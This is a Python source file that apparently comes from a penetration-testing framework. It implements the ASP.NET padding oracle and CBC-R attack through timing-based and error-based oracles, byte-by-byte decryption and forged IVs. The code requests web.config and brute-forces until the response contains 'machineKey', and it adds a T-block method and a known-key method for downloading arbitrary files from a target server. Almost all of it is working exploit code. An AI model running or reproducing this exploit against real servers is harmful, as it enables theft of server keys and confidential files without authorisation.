import re
import gzip
import time
import struct
import random
import StringIO
import htmlentitydefs
import timeoutsocket
import urllib2 # TODO replace by spkproxy in tblock thing

from libs import spkproxy
from internal import devlog
from libs.Crypto.Cipher import DES

import socket
import timeoutsocket
from contextlib import contextmanager

TIMEOUTSOCKET_REF = timeoutsocket.timeoutsocket
NO_TIMEOUTSOCKET  = socket._no_timeoutsocket
REAL_SOCKET        = socket._realsocket

# Default timeout in seconds for socket connections
TIMEOUT = 5

@contextmanager
def socket_timeout(timeout):
    """
    Wrap python's 2.3+ default socket timeout mechanism
    in a with statement while ensuring this all works
    fine with timeoutsocket.

    We have to do this here because timeoutsocket timeouts
    do not work with urllib2.
    """
    socket.socket = NO_TIMEOUTSOCKET
    socket.setdefaulttimeout(timeout)
    try:
        yield
    finally:
        socket.setdefaulttimeout(None)
        socket.socket = TIMEOUTSOCKET_REF



def UrlTokenEncode(data):
    """
    Url safe Base64 encoding.
    """
    toadd = "0"

    base64 = data.encode("base64").replace("\n", "")
    base64 = base64.replace("/", "_")
    base64 = base64.replace("+", "-")

    if base64[-1] == "=":
        toadd = "1"
        base64 = base64[:-1]
        if base64[-1] == "=":
            toadd = "2"
            base64 = base64[:-1]

    return base64 + toadd

def UrlTokenDecode(data):
    """
    Url safe Base64 decoding.
    """
    toadd = ord(data[-1]) - ord("0")
    data = data.replace("_", "/")
    data = data.replace("-", "+")

    return data[:-1] + toadd*"="

class AbstractOracle:
    """
    This is the basic oracle. Subclass this to create a new specific oracle suiting 
    your needs.
    """
    def query(self, data):
        """
        The Padding Oracle returns 0 for an incorrect padding
        and 1 for a correct padding.
        """
        raise NotImplementedError('abstract')

class GenericOracle(AbstractOracle):
    def __init__(self):
        self.responses = {}

    def query(self, data):
        try:
            data = UrlTokenEncode(data)
            response = spkproxy.urlopen(self.url + data)

            if self.detect(response) == 1:
                devlog('oracle', self.url + data)
                return 1
            return 0
        except Exception:
            return 0

    def detect(self, response):
        buffer = response.read()

class TimingOracle(AbstractOracle):
    def __init__(self, url):
        self.url = url + "WebResource.axd?d="

        self.min_time = 1000000
        self.nsamples = 10

    def calibrate(self, data):
        valid_url = None

        while True:
            self.nsamples += 2

            for i in xrange(0, 256):
                t1 = None
                t2 = None

                times = []

                values = list(data)
                values[7] = chr(i)
                values = UrlTokenEncode(''.join(values))


                for i in xrange(self.nsamples):
                    response = None

                    t1 = time.time()
                    response = spkproxy.urlopen(self.url + values)
                    t2 = time.time()

                    times.append((t2-t1)*10000)

                average = sum(times) / len(times)

                if average < self.min_time:
                    self.min_time = average
                    valid_url = response.url

                if valid_url.split("=")[1] == UrlTokenEncode(data):
                    devlog('oracle', "Calibrated ok with %r" % self.nsamples)
                    devlog('oracle', "Calibrated to %r for a valid padding request %r" % (self.min_time, valid_url))
                    return
                
                self.min_time = 100000000

    def query(self, data):
        times = []
        data = UrlTokenEncode(data)
        for i in xrange(self.nsamples):
            t1 = time.time()
            response = spkproxy.urlopen(self.url + data)
            t2 = time.time()

            times.append((t2-t1)*10000)

        average = sum(times) / len(times)

        if (self.min_time + (self.min_time * (7/100.0))) < average:
            return 0

        return 1

class AspNetOracle(AbstractOracle):
    """
    This generic oracle makes a request to a webserver
    and watches the response code. If the response code is 200 OK
    then the padding is ok, if it is not 200 OK then the padding
    is incorrect.
    """
    def __init__(self, url):
        self.url = url

    def query(self, data):
        data = UrlTokenEncode(data)

        response = spkproxy.urlopen(self.url + data)

        if self.detect(response) == 1:
            return 1

        return 0

    def detect(self, data):
        buffer = data.read()

        if buffer.count("CryptographicException") == 0:
            return 1

        return 0

class InvalidBlockSize(Exception):
    pass

class PaddingOracleAttack:
    """
    This is a generic class implementing the Padding Oracle Attack and the CBC-R 
    technique discovered by Juliano Rizzo and Thai Duong. 
    """
    def __init__(self, oracle, block_size=None, log=None):
        """
        We need a valid Oracle for the attack to work. Take a look at the simple ones
        that are subclasses of AbstractOracle.
        """
        self.log = log
        self.oracle = oracle
        self.imv = None
        self.decrytped = None
        self.encrypted = None
        self.block_size = block_size
        self.iv = None

    def getBlockSize(self, block):
        """
        Try to make an educated guess about the size of the blocks.
        """
        cipherlen = len(block)

        if cipherlen % 8 != 0:
            devlog('oracle', '%r' % cipherlen)
            raise InvalidBlockSize()

        if cipherlen % 16 == 8:
            return 8

        # Query the oracle.
        if self.oracle.query(block + block[-16:]) == 1:
            return 8

        return 16

    def encrypt(self, imv, value):
        """
        Encrypt 'value' using the intermediate value of 'encrypted'
        to forge a fake IV.

        It returns a string with the Forged IV value
        """
        r = ''.join(map(lambda x: chr(ord(x[0])^ord(x[1])), zip(imv, value)))
        return r

    def split(self, seq, length):
        """
        Splits the stream into 'length' sized blocks.
        """
        return [seq[i:i+length] for i in range(0, len(seq), length)]

    def decrypt(self, blocks):
        """
        Decrypts as much as you can from blocks and then return a tuple
        with two lists, the first is the list of IMV's and the second one is
        a list of the plain texts (including padding at the end of the last block)
        """
        # Block size is a fundamental variable. We need to get this right.
        self.block_size = self.getBlockSize(blocks)

        # TODO: Fix this for the second decrypt phase.
        self.block_size = 8

        # Split each block
        blocks = self.split(blocks, self.block_size)

        imvs = []
        plain_text = []

        for i in xrange(len(blocks)-1):
            imv, decrypted = self.block_decrypt(blocks[i], blocks[i+1])

            plain_text.append(decrypted)
            imvs.append(imv)

        return (imvs, plain_text)

    def block_decrypt(self, iv, block):
        # This will hold our decrypted stream.
        decrypted = ['\x00'] * self.block_size

        # The intermediate values are the ones that were generated after the
        # decrypt routine, but before the CBC XOR stuff.
        intermediate = ['\x00'] * self.block_size

        # We are going to forge each one of the valid paddings to recover the intermediate
        # values.
        for i in xrange(1, self.block_size + 1):
            
            if self.log != None:
                self.log("Decrypting byte " + str(i) + " of " + str(self.block_size))
            
            # We try in a byte per byte bruteforce fashion.
            found = False
            for j in xrange(0, 256):
                # Forged IV value.
                forged = ['\x00']*8

                # We now need to generate valid paddings. That is from the i'th possition
                # we need i times the i value as a padding.
                # As the attack advances, we just need to bruteforce the current position (i)
                # because we collect the intermediate values obtained from the previous position
                # and that allows us to forge any padding value on the resulting stream.
                forged[-i] = chr(j)
                for k in xrange(i-1, 0, -1):
                    forged[-k] = chr(ord(intermediate[-k])^i)

                # Append the forged IV value with the encrypted stream.
                forged = ''.join(forged) + block

                # Test if we have generated a valid padding.
                if self.oracle.query(forged) == 0:
                    continue

                # j^i is the intermediate value we got and xored with the original IV gives us
                # the decrypted value.
                decrypted[-i] = chr(j^i^ord(iv[-i]))

                # Save the intermediate value so we can forge arbitrary values later.
                intermediate[-i] = chr(j^i)

                found = True
                break

            # We've tried all the possible bytes and none of them was ok. We are stucked.
            if found == False:
                raise "Could not decrypt, maybe try another block"

        return (''.join(intermediate), ''.join(decrypted))


    def brute_force(self, url, block, stop_function=None):
        """
        This method bruteforces a very specific block in order to get web.config
        using ScriptResource.axd
        """
        requests = 0
        found = False
        # Freaking huge ammount of possible requests.
        while not found:
            if stop_function and stop_function():
                return None
            
            # This scheme for bruteforcing seems to be more efficient than incrementally
            # modifying each byte. I have no grounds to backup this more than empirical
            # evidence.
            fake_block = struct.pack("Q", random.randint(0, 2**64-1)) + block

            requests += 1
            if requests % 512 == 0:
                self.log("Requests " + str(requests))

            # Same here. I need to check the response code.
            try:
                with socket_timeout(TIMEOUT):
                    response = urllib2.urlopen(url + UrlTokenEncode(fake_block))
            except urllib2.HTTPError, e:
                continue
            except Exception: #TODO this is to catch some timeouts, should fix it!
                continue

            if response.code == 200:
                r = response.read()
                if r.count("machineKey"):
                    self.log("Grab web.config from " + url + UrlTokenEncode(fake_block))
                    self.log("Done in " + str(requests) + " requests.")
                    return r



    def download_file(self, url, encrypted, file_name, stop_function=None):
        self.log("Decrypting phase 1 ...")
        imvs, decrypted = self.decrypt(encrypted)
        d = decrypted[0]

        if d == "\x08\x07\x06\x05\x04\x03\x02\x01":
            self.log("Decrypting failed. Is the host vulnerable?")
            return 0

        d = d[:-ord(d[-1])]

        self.log("Decrypted block: " + d)
        imv1 = imvs[0]

        # These two values will be encrypted.
        value2 = "|||~/web"
        value1 = ".config\x01"

        # We have to start encrypting from right to left.
        iv1 = self.encrypt(imv1, value1)

        # We forged the previous block to make it decrypt to k3wl stuff
        new_block = iv1 + encrypted[-8:]

        if stop_function and stop_function():
            return None
        
        self.log("Decrypting phase 2 ...")
        fake_iv = "\x41" * 8
        decrypt2 = fake_iv + iv1
        imv2 = self.decrypt(decrypt2)[0][0]
        iv2 = self.encrypt(imv2, value2)
        new_block = iv2 + new_block
        self.log("Bruteforcing (It would be wise to prepare some coffee)")

        file_content = self.brute_force(url, new_block, stop_function)
        return file_content


class TBlockAttack():
    def __init__(self, url, padding_blocks, check_patterns=None):
        self.url = url
        self.padding_blocks = padding_blocks
        self.tblock = None
        self.qrblock = None
        self.nrequests = 0
        self.block_size = 8
        # make sure there are no empty patterns
        check_patterns = [pattern for pattern in check_patterns if pattern]
        try:
            self.check_patterns = map(re.compile, check_patterns)
        except re.error, e:
            msg = ("There was an error compiling the regex patterns:\n"
                   "  %s\n"
                   "Please review your configuration."
                   "The provided patterns will be ignored during this scan")
            self.log(msg % e)
            self.check_patterns = []

    def log(self, texto):
        devlog('oracle', '> %r' % texto)

    def getTotalRequests(self):
        return self.nrequests

    def _getRandomBlock(self):
        block = ""
        for i in range(self.block_size):
            block += chr(random.randint(0,255))
        return block

    def set_tblock(self, tblock):
        self.tblock = tblock

    def get_tblock(self):
        return self.tblock

    def set_qrblock(self, qrblock):
        self.qrblock = qrblock    

    def get_qrblock(self):
        return self.qrblock


    def downloadFile(self, filename, stop_function=None):
        if not self.tblock:
            self.log("We need to find a t-block")
            self.findTBlock(stop_function=stop_function)
        else:
            self.log("We already have a t-block")

        preface = "|||~/"
        # Prepare the filename: prepend |||~/, split in blocksize and padd 
        npadding_bytes = self.block_size - len(preface+filename)%self.block_size
        if npadding_bytes == 0:
            npadding_bytes = self.block_size

        padding_bytes = chr(npadding_bytes)*npadding_bytes
        
        dec_blocks = []
        resto = preface + filename + padding_bytes
        while resto != "":
            dec_blocks.append(resto[:self.block_size])
            resto = resto[self.block_size:]

        dec_blocks.reverse()
        # Find all the intermediate values and the ivs to forge what we want
        worked = False
        while not worked:
            imvs = []
            ivs = []
            ivs.append(self._getRandomBlock())
            i=0
            worked = True
            while worked and i < len(dec_blocks):
                imv = self._findIMV(ivs[i])
                if imv:
                    ivs.append(''.join(map(lambda x: chr(x[0]^ord(x[1])), zip( imv, dec_blocks[i]))))
                    imvs.append(imv)
                    worked = True
                else:
                    self.log("Generating another random block")
                    worked = False
                i += 1

        ivs.reverse()
        imvs.reverse()
        if self.qrblock:
            devlog('oracle', 'qrblock = %r' % self.qrblock)
            self.nrequests += 1
            data, response = self.request(self.url + UrlTokenEncode(self.qrblock + ''.join(ivs)))
            if response.code != 200:
                return None #TODO, see how to fail cleanly
        else:
            #Find the qr-block and download the file
            worked = False
            while not worked:

                if stop_function and stop_function():
                    self.log('Aborting T-Block attack (download file)..')
                    return None

                res = self._findQRBlock(ivs[len(ivs)-1], imvs[len(imvs)-1], stop_function=stop_function)
                if not res: return None
                
                self.qrblock, n = res
                self.log("Pottential qrblock: " + self.qrblock.encode("hex"))
                try:
                    self.nrequests += 1
                    data, response = self.request(self.url + UrlTokenEncode(self.qrblock + ''.join(ivs)))
                    if response.code == 200:
                        worked = True
                except urllib2.HTTPError, e:
                    continue
                except Exception:
                    self.log("Exception, just skip it")
                    continue

        self.log("Download link: " + self.url + UrlTokenEncode(self.qrblock + ''.join(ivs)))
        encoding_header = "Content-Encoding"
        if not isinstance(response.headers, dict):
            # common urllib2 response which has all in lowercase
            encoding_header = encoding_header.lower()
        
        is_gzipped = 'gzip' in response.headers.get(encoding_header, '')
        if is_gzipped:
            self.log("Data was gziped, uncompressing...")
            compresseddata = data
            compressedstream = StringIO.StringIO(compresseddata)
            gz = gzip.GzipFile(fileobj=compressedstream)
            data = gz.read()

        return data

    def request(self, url):
        with socket_timeout(TIMEOUT):
            response = urllib2.urlopen(url)
            
        data = ""
        if response.code == 200:
            data = response.read()
        
        return [data, response]
    

    def checkResponse(self, code, data):
        # Check if response is 200 and none of the check patterns is found in the response data.
        # Sometimes we may get a 200, but really was an error with a redirect
        pattern_matched = any(s.search(data) for s in self.check_patterns)
        if code == 200 and not pattern_matched:
            self.log("ok")
            return True
        else:   
            return False


    # Verified
    def findTBlock(self, second_byte_valid=False, max_requests=0, stop_function=None):
        requests = 0
        max_succesive_timeouts = 50
        succesive_timeouts = 0

        self.log("Trying to find a tblock...")
        found = False

        while not found and (requests < max_requests or max_requests == 0) and succesive_timeouts < max_succesive_timeouts:
            if stop_function and stop_function():
                break
                
            # Forge a new random block hoping that it will be a T block.
            rand_block = struct.pack("Q", random.randint(0, 2**64-1))
            rand_block = "\x00\x00" + rand_block[2:]

            fake_block = rand_block * 2 + self.padding_blocks
            requests += 1

            if (requests % 50) == 0 :
                self.log("Requests " + str(requests))

            # I've changed this to use urllib2 cause i needed to check the 
            # response code. TODO double check if i can do this with spikeproxy.

            try:
                self.nrequests += 1
                data, response = self.request(self.url + UrlTokenEncode(fake_block))
                code = response.code
            except timeoutsocket.Timeout, e:
                    succesive_timeouts += 1
                    continue
            except urllib2.URLError, e:
                    continue

            succesive_timeouts = 0

            if self.checkResponse(code, data):
                self.log("FOUND TBLOCK in %d requests, for manual verification: " % requests  + self.url + UrlTokenEncode(fake_block))

                decrypted_blocks = "T" + data[data.find("<title>")+7:data.find("</title>")]
                decrypted_blocks = self._removeSpecialEntities(decrypted_blocks)

                #If decrypted len is less than unencrypted, something is wroooong.
                #Pottentially a the decoded data contains some unicode secuence being wrongly interpreted :/
                #just another variation of evil t-block.
                if len(decrypted_blocks) < self.block_size*2:
                    self.log("This t-block is EVILLLL!!!!, need to search for other one")
                    continue

                if decrypted_blocks[0] != decrypted_blocks[self.block_size]:
                    self.log("This t-block is EVILLLL!!!!, need to search for other one")
                    continue

                if not second_byte_valid or decrypted_blocks[1] < 0x80:
                        self.tblock = rand_block
                        found = True
                        #self.iv0 = decrypted_blocks[1]

        if succesive_timeouts >= max_succesive_timeouts:
            self.log("Succesive timeout limit reached")

        if requests >= max_requests:
            self.log("Max amount of requests reached")

        return found


    # Verified
    def _findFixedPos(self, encryptedBlock):

        test_blocks1 = self.tblock + encryptedBlock + "\x00"*self.block_size + self.padding_blocks
        test_blocks2 = self.tblock + encryptedBlock + "\x80"*self.block_size + self.padding_blocks

        self.nrequests += 1
        data1, response1 = self.request(self.url + UrlTokenEncode(test_blocks1))
        decrypted_data1 = self._removeSpecialEntities("T" + data1[data1.find("<title>")+7:data1.find("</title>")])

        self.nrequests += 1
        data2, response2 = self.request(self.url + UrlTokenEncode(test_blocks2))
        decrypted_data2 = self._removeSpecialEntities("T" + data2[data2.find("<title>")+7:data2.find("</title>")])

        pos = 0
        while decrypted_data1[pos] == decrypted_data2[pos]:
            pos += 1

        pos = len(decrypted_data1)-pos
        return pos


    # Verified
    def _findIMV(self, encrypted_block):

        pos = self._findFixedPos(encrypted_block)

        self.log("Finding iv for " + encrypted_block.encode("hex"))
        iv_num = [0] * self.block_size

        nretries = 0
        maxretries = 20

        finished = False
        while not finished:
            nretries += 1
            iv = ''.join(map(chr,iv_num))
            fake_block = self.tblock + iv  + encrypted_block + "\x00"*self.block_size +  self.padding_blocks

            self.nrequests += 1
            data, response = self.request(self.url + UrlTokenEncode(fake_block))

            decrypted_block = "T" + data[data.find("<title>")+7:data.find("</title>")]
            decrypted_block = self._removeSpecialEntities(decrypted_block)
            data = decrypted_block[-pos-self.block_size: -pos]

            if nretries > maxretries:
                self.log("Maximun number of corrections exceeded, need to try with other block")
                return False

            finished = True
            for i in range(self.block_size-1, -1, -1):
                if data[i] == ord("?"):
                    iv_num[i] += 0x4f
                    if iv_num[i] > 255:
                        iv_num[i] = 0x11
                    finished = False

        imv = map(lambda x: ord(x[0])^x[1], zip(iv, data))
        self.log("IMV for %s found :%s" % (encrypted_block.encode("hex"), imv))

        if self._verifyIMV(encrypted_block, imv):
            return imv

        # We failed
        return False


    
    def _verifyIMV(self, encrypted_block, imv):

        if self.block_size == 8:
            magicword = "FERRNET\x01"
        elif self.block_size == 16:
            magicword = "FERNET CON COCA\x01"

        iv = ''.join(map(lambda x: chr(x[0]^ord(x[1])), zip( imv, magicword)))

        test_block = self.tblock + iv + encrypted_block + self.padding_blocks

        data, response = self.request(self.url + UrlTokenEncode(test_block))

        decrypted_block = "T" + data[data.find("<title>")+7:data.find("</title>")]
        decrypted_block = ''.join(map(chr, self._removeSpecialEntities(decrypted_block)))

        if magicword in decrypted_block:
            self.log("IMV verified OK")
        else:
            self.log("IMV verification Failed")

        return magicword in decrypted_block


    def _findQRBlock(self, blockenc, blockimv, stop_function=None):
        nblocks = 4
        ngroups = 30
        self.log("Bruteforcing using t-block optimization, trying to find a qr-block")
        flag = "IM" + "M"*(self.block_size-8)  + "MUNITY"
        blockiv = ''.join(map(lambda x: chr(x[0]^ord(x[1])), zip( blockimv, flag))) #############

        nrequests = 0
        while 1:
                if stop_function and stop_function():
                    return None

                nrequests +=1
                if (nrequests % 50) == 0 :
                    self.log("Requests " + str(nrequests))

                fake_blocks = []

                #[rnd block 1][rnd block 2][rnd block 3][rnd block 4][trashh block][IMMUNITY]->
                #[rnd block 5][rnd block 6][rnd block 7][rnd block 8][trashh block][IMMUNITY]->
                #etc
                # Generate j groups of i random blocks each one
                for j in range(ngroups):
                        for i in range(nblocks):
                            rand_block = struct.pack("Q", random.randint(0, 2**64-1))
                            rand_block = "\x00\x00" + rand_block[2:]
            
                            #Fix if blocksize is not 8
                            rand_block = rand_block*(self.block_size/8)  
                            fake_blocks.append(rand_block)

                        fake_blocks.append(blockiv)
                        fake_blocks.append(blockenc)

                #Decrypt them
                data = self.t_magic_bulk_decrypt(fake_blocks)
                imvs = []
                pos = 0
                for j in range(ngroups): 
                    if stop_function and stop_function():
                        return None
                    pos =  (''.join(map(chr, data))).find(flag,pos+self.block_size+1)-self.block_size  #end of the group
                    decrypted_blocks= data[pos-nblocks*self.block_size:pos]

                    #Calculate all the intermediate values
                    for i in range(nblocks):
                        decrypted_block = decrypted_blocks[ i*self.block_size : (i+1)*self.block_size]
                        imv = [decrypted_block[0], decrypted_block[1]]
                        imvs.append(imv)

                #Check if we've got what we wanted
                for i in range(nblocks*ngroups):
                    if stop_function and stop_function():
                        return None

                    if imvs[i][0] in [ord("R"), ord("r"), ord("Q"), ord("q")] and imvs[i][1] == ord("#"):
                        #if self.t_magic_verify_qrblock(url, magicBlock, validBlock, fake_blocks[i]):
                        #    return (fake_blocks[i], nrequests)
                        return (fake_blocks[i + (i/nblocks)*2], nrequests)
        return None


    def t_magic_bulk_decrypt(self, encryptedBlocks):

        nblocks = len(encryptedBlocks)
        encryptedBlock = ''.join(encryptedBlocks)
        fake_block = self.tblock + encryptedBlock + self.padding_blocks

        self.nrequests += 1


        done = False
        tries = 0
        while not done and tries < 4:
            try:
                #TODO 
                # If we use self.request (as we should), on the WebCrawler it would be
                # using canvas TimeoutSockets, and somehow this makes each request
                # last more than 1.5 seconds
                #response = urllib2.urlopen(self.url + UrlTokenEncode(fake_block))
                data, response = self.request(self.url + UrlTokenEncode(fake_block))
                if response.code == 200:
                    done = True
                else:
                    tries += 1
                #data = ""
                #if response.code == 200:
                #    data = response.read()
                #done = True
            except urllib2.URLError, e:
                tries += 1
        if not done:
            self.log("Failed to connect: " + e)
            return None

        decrypted_blocks = "T" +data[data.find("<title>")+7:data.find("</title>")]
        decrypted_blocks = self._removeSpecialEntities(decrypted_blocks)

        return decrypted_blocks


    # Verified
    def _removeSpecialEntities(self, inputbuf):

        buf = inputbuf.replace("\xef\xbf\xbd", "?")

        p = re.compile("&#[x]*([\d,a,b,c,d,f]+);",re.IGNORECASE)

        def decode_html(x):
            n = int(x.group(1),16 if 'x' in x.group(0) else 10)
            return struct.pack("!"+("B", "H")[n>255], n)

        buf = p.sub(decode_html, buf)

        def decode_entities(x):
            if x.group(1) in htmlentitydefs.name2codepoint.keys():
                n = htmlentitydefs.name2codepoint[x.group(1)]
                return struct.pack("!"+("B", "H")[n>255], n)
            else:
                return "?"

        p = re.compile("&([a-z,A-Z]+);",re.IGNORECASE)
        buf = p.sub(decode_entities, buf)

        out = []
        for i in buf:
            out.append( ord(i))

        return out


    # TODO, we should use this        
    def t_magic_getiv0(self, url, magicBlock, padding_blocks):
        test_data = UrlTokenEncode(magicBlock + "\x20"*8 + magicBlock + "\x90"*8 + magicBlock +  padding_blocks)

        try:
            self.nrequests += 1
            data, response = self.request(url + test_data)
        except urllib2.HTTPError, e:
            return

        decrypted_blocks = "T" + unescape(data[data.find("<title>")+7:data.find("</title>")])

        #Convert undefined values to \xff
        decrypted_blocks = decrypted_blocks.replace("\xef\xbf\xbd", "?")
        decrypted_blocks = self._removeSpecialEntities(decrypted_blocks)


        iv0 = decrypted_blocks[8*2]  ^ 0x20 ^ decrypted_blocks[0]
        iv1 = decrypted_blocks[8*2+1]  ^ 0x20 ^ decrypted_blocks[1]

        #TODO: IMPORTANTE! todavia me falta verificar si los bytes 16 y 17 son invalidos, 
        # en cuyo caso deberia ir con los del otro bloque de iv 0x90

        #print decrypted_blocks
        return (iv0, iv1)


class KnownKeysAttack():

    def __init__(self, encryptionkey, url):
        self.block_size = 8
        self.encryptionkey = encryptionkey
        self.iv = '\0'*8
        self.url = url
    
    def download_file(self, file_name):
        query = self._get_query_string(file_name)
        encrypted_query = self._encrypt(query)
        with socket_timeout(TIMEOUT):
            response = urllib2.urlopen(self.url + UrlTokenEncode(encrypted_query))

        if response.code == 200:
            return response.read()
        else:
            return None

    def _encrypt(self, data):

        obj = DES.triple_des(self.encryptionkey.decode("hex"), DES.CBC, self.iv)
        return obj.encrypt(data)


    def _get_query_string(self, file_name):

        preface = "R|~/"

        npadding_bytes = self.block_size - len(preface+file_name)%self.block_size
        if npadding_bytes == 0:
            npadding_bytes = block_size

        padding_bytes = chr(npadding_bytes)*npadding_bytes

        return preface + file_name + padding_bytes

